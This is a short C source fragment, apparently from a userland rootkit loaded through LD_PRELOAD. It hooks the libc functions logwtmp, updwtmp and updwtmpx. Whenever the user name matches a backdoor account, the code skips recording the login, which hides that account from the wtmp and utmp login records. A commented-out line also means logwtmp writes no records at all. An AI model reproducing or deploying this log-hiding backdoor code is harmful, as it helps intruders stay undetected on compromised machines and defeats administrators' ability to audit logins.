void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host){
	if(hide_me)
		return;
	if(!xstrncmp(ut_name, BD_UNAME)){
		hide_me = 1;
		return;
	}
	hook(CLOGWTMP);
//	call(CLOGWTMP, ut_line, ut_name, ut_host);	// VERY DIRTY FIX. !!! FIX IT AS FAST AS POSIBLE !!!
	return;
}

void updwtmp(const char *wfile, const struct utmp *ut){
	if(hide_me)
		return;
	if(ut && ut->ut_user != NULL)
		if(!xstrncmp(ut->ut_user, BD_UNAME)){
			hide_me = 1;
			return;
		}
	hook(CUPDWTMP);
	call(CUPDWTMP, wfile, ut);
}

void updwtmpx(const char *wfilex, const struct utmpx *utx){
	if(hide_me)
		return;
	if(utx && utx->ut_user != NULL)
		if(!xstrncmp(utx->ut_user, BD_UNAME)){
			hide_me = 1;
			return;
		}
	hook(CUPDWTMPX);
	call(CUPDWTMPX, wfilex, utx);
}
